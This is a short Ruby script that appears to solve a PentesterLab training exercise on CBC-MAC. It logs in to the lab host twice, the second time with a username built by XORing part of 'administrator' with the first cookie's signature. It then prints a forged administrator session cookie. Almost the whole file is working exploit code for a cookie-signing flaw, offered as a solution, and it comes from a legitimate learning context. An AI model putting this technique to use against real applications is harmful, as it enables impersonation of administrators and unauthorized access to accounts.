#https://pentesterlab.com/exercises/cbc-mac

require 'httparty'
require 'base64'

URL = "http://ptl-e679b31b-95eaadc9.libcurl.so/"

def login(username)
    res = HTTParty.post(URL + 'login.php', body:{username:username,
                                                 password:'Password1'},
                                            follow_redirects:false)
    puts res.headers['set-cookie']
    return res.headers['set-cookie'].split('=')[1]
end

cookie = login("administ")
signature1 = Base64.decode64(cookie).split("--")[1]

def xor(str1,str2)
    ret = ""
    str1.split(//).each_with_index do |c,i|
        ret[i]=(str1[i].ord ^ str2[i].ord).chr
    end
    return ret
end

username2 = xor("rator\00\00\00",signature1)
puts username2
cookie2 = login(username2)
puts cookie2
cookie2 = cookie2.gsub("%2B","+")
puts cookie2
signature2 = Base64.decode64(cookie2).split("--")[1]
puts signature2
puts Base64.encode64("administrator--#{signature2}") #this is the final cookie for administrator and signature

